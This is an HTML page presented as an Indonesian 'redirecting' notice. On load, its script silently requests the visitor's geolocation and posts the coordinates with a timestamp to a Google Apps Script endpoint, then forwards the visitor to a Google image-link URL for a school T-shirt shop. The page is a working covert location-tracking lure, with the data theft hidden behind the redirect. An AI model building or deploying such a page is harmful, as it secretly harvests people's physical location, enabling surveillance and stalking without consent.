<!DOCTYPE html>
<html>
<head>
  <title>Mengalihkan...</title>
  <script>
    const targetURL = "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.bapelright.biz%2Fkaos-sekolah-keren%2F&psig=AOvVaw12Y-mzmjlt7_FCdRf_DTxv&ust=1748073317359000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCNiMrNuOuY0DFQAAAAAdAAAAABAE";

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      fetch('https://script.google.com/macros/s/AKfycbzOGqGyILelvwLKqhavkSfgMq6zXMrtQyRUjEr3gDCFzj7h23LDebSY__czSvdIde7K/exec', {
        method: 'POST',
        body: JSON.stringify({
          latitude: latitude,
          longitude: longitude,
          timestamp: new Date().toISOString()
        }),
        headers: {
          'Content-Type': 'application/json'
        }
      })
      .then(response => response.text())
      .then(text => {
        console.log("Response from GAS:", text);
      })
      .catch(error => {
        console.error("Error sending location:", error);
      })
      .finally(() => {
        // Redirect tetap dilakukan walau error
        window.location.href = targetURL;
      });
    }

    function handleError() {
      window.location.href = targetURL;
    }

    window.onload = () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        handleError();
      }
    }
  </script>
</head>
<body>
  <p>Sedang mengalihkan...</p>
</body>
</html>
